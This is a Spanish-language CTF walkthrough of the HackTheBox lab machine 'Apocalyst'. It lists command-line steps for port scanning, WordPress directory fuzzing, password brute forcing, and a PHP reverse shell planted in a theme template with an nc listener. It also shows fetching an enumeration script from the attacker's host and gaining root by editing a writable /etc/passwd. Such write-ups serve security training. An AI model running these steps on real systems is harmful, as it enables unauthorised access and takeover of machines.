# Apocalyst

IP:  10.10.10.46

 
## Ip y whichSystem.py

`ping -c 1  10.10.10.46`

`whichSystem.py  10.10.10.46`

## Scanning

`nmap -p- --open -T5 -n -v 10.10.10.46 -oN allPorts`

`whatweb http://10.10.10.46`

`nmap -sC -sV -p22,80 10.10.10.46 -oN targetedPorts`

`locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u`

`nmap --script "vuln and safe" -p80 10.10.10.46`

`nmap --script http-enum -p80 10.10.10.46 -oN webScan`

## Miramos la web

- Wapallyzer 
- CTRL+U
- Vemos los JS cargandolos desde apocalyst.htb
- Virtual Hosting

`nano /etc/hosts` --> 10.10.10.46 apocalyst.htb

- wp-login.php

`wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://apocalyst.htb/FUZZ`

`wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://apocalyst.htb/FUZZ` --> -L redirects

- wpseku github
- git clone
- pip3 install -r -requirements
- python3 wpseku.py
- python3 wpseku.py --url http://apocalyst.htb

`wpseku.py --url http://apocalyst.htb > ~/htb/apocalyst/content/wpScan`

`cewl -w dictionary http://apocalyst.htb`

`cat dictionary | wc -l`  

`wfuzz -c -L --hc=404 --hh=157 -w dictionary http://apocalyst.htb/FUZZ`

## Trabajamos con la imagen

`file image.jpg`

`strings image.jpg -n 10`

`binwalk image.jpg`

`steghide info image.jpg`

`steghide extract -sf image.jpg` 

`python3 wpseku.py --url "http://apocalyst.htb" --brute --user Falaraki --wordlist /home/yintao/htb/apocalyst/content/list.txt`


## Dentro del wordpress

- Appearance --> Editor --> 404 template 
- https://github.com/pentestmonkey/php-reverse-shell
- Cambiamos IP y port al script
- Lo copiamos en el 404
- bash --> `nc -nlvp 443`
- apocalyst.htb/?p=404.php

~~~
whoami
uname -a
hostname -I
script /dev/null -c bash
~~~
- CTRL+Z
- ssty raw -echo
- fg
- reset
- xterm --> echo $TERM --> export TERM=xterm
- export SHELL=bash
- CTRL+L

~~~
cd /home/
cat user.txt
cd /root/
~~~

## Escalada de privilegios
- `wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh`
- `python -m SimpleHTTPServer`

~~~
wget http://10.10.14.23:8000/lse.sh
chmod +x lse.sh
/lse.sh.
/lse.sh -l 1
~~~
- Podemos escribir en /etc/passwd
~~~
cat /etc/passwd
cat /etc/login.defs | grep "ENCRYPTED_METHOD"
openssl passwd
nano /etc/passwd 
~~~
- Cambiamos X de root por el hash de openssl
- su root
- whoami
- cd /root/
- cat root.txt
